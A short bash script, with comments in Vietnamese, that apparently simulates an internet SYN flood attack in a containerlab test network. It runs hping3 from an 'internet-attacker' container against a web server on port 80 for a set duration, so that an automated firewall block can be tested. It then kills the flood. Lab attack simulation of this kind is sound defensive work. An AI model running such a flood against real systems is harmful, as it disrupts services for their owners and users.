#!/usr/bin/env bash
# =============================================================================
# Kịch bản 01: Tấn công DoS SYN Flood từ Internet (North - South Attack)
# Mục đích: Bắn bão gói TCP SYN vào port 80 của Web Server qua Firewall
# Nguồn: internet-attacker (203.0.113.10)
# Đích: service-server (192.168.10.10:80)
# Điểm chặn tự động: Firewall (iptables drop nguồn 203.0.113.10)
# Công cụ: hping3
# =============================================================================
set -euo pipefail

DURATION="${1:-60}"
P="clab-aiops-prod"
CLEANED=0

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [START] Kịch bản 01: Internet SYN Flood (Thời lượng: ${DURATION}s)..."

cleanup() {
  [ "$CLEANED" -eq 1 ] && return
  CLEANED=1
  echo
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] [CLEANUP] Dừng hping3 trên internet-attacker..."
  docker exec "$P-internet-attacker" killall -9 hping3 2>/dev/null || true
}
trap 'cleanup; exit 130' INT
trap 'cleanup; exit 143' TERM
trap cleanup EXIT

echo "  [+] Bắn TCP SYN Flood tốc độ cao (~2000 pkts/s) vào 192.168.10.10:80..."
docker exec "$P-internet-attacker" sh -c \
  "nohup hping3 -S -p 80 -i u500 192.168.10.10 >/dev/null 2>&1 &"

END_TIME=$(( $(date +%s) + DURATION ))
while [ "$(date +%s)" -lt "$END_TIME" ]; do
  sleep 1
done

cleanup
echo "[$(date '+%Y-%m-%d %H:%M:%S')] [END] Kịch bản 01: Internet SYN Flood hoàn thành."
